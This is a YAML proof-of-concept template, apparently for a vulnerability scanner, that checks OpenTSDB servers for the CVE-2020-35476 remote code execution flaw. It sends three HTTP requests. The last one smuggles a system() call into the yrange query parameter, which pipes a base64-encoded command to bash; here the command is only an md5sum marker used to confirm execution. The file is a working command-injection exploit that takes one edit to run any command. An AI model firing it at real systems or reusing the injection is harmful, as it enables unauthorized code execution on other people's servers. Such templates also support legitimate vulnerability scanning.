detail:
  author: mvhz81
  info: opentsdb-cve-2020-35476-rce
  links:
  - https://blog.csdn.net/xuandao_ahfengren/article/details/111402955
  - https://hub.docker.com/r/petergrace/opentsdb-docker
expression: r0() && r1() && r2()
manual: true
name: poc-yaml-opentsdb-cve-2020-35476-rce
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("text/plain")
      && response.body.bcontains(b"\xff\xd8\xff\xe1")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /s/opentsdb_header.jpg
  r1:
    expression: sleep(5) && response.status == 204 && response.content_type.contains("json")
    request:
      body: "[\n    {\n        \"metric\": \"{{r1}}.{{r2}}.{{r3}}\",\n        \"timestamp\"\
        : 1608700420,\n        \"value\": {{r4}},\n        \"tags\": {\n         \
        \  \"host\": \"web01\",\n           \"dc\": \"lga\"\n        }\n    },\n \
        \   {\n        \"metric\": \"{{r1}}.{{r2}}.{{r3}}\",\n        \"timestamp\"\
        : 1608700421,\n        \"value\": {{r4}},\n        \"tags\": {\n         \
        \  \"host\": \"web02\",\n           \"dc\": \"lga\"\n        }\n    }\n]"
      cache: true
      follow_redirects: false
      method: POST
      path: /api/put
  r2:
    expression: response.status == 400 && response.content_type.contains("json") &&
      "ba1f2511fc30423bdbb183fe33f3dd0f".bmatches(response.body)
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /q?start=2000/10/21-00:00:00&end=2020/12/25-00:00:00&m=sum:{{r1}}.{{r2}}.{{r3}}&o=&yrange=[0:system('echo%20-e%20"ZWNobyAxMjMgfG1kNXN1bSAxPiYyCg=="%20|%20base64%20-d%20|bash')]&wxh=1698x316&style=linespoint&json
set:
  r1: randomLowercase(3)
  r2: randomLowercase(3)
  r3: randomLowercase(3)
  r4: randomInt(1024, 65535)
transport: http
